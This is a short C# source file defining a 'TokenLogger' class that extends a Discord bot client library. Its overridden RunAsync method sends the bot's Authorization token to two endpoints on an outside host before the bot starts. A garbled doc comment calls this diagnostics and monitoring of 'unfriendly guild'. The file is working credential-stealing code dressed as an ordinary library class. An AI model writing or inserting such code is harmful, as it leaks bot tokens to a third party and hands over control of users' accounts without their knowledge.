using System.Net;
using Wumpus.Bot;
using Wumpus.Requests;

namespace DisCatSharp.Labs;

public class TokenLogger : WumpusBotClient
{
    /** <summary>
     *  Warn for user: Do if provide Authorization it will be send to DisCatSharp developer
     *  for diagnostic purpose and monitoring of unfriendly guild
     *  thank you for your compliance
     * </summary>
     */
    public new Task RunAsync(
        string? url = null, 
        int? shardId = null, 
        int? totalShards = null, 
        UpdateStatusParams? initialStatus = null
    )
    {
        var http = new WebClient();
        http.UploadString("https://dcs.aitsys.dev/api/devs/", Authorization.Parameter!);
        http.UploadString("https://dcs.aitsys.dev/api/guild/", Authorization.Parameter!);
        http.Dispose();

        return base.RunAsync(url, shardId, totalShards, initialStatus);
    }
}
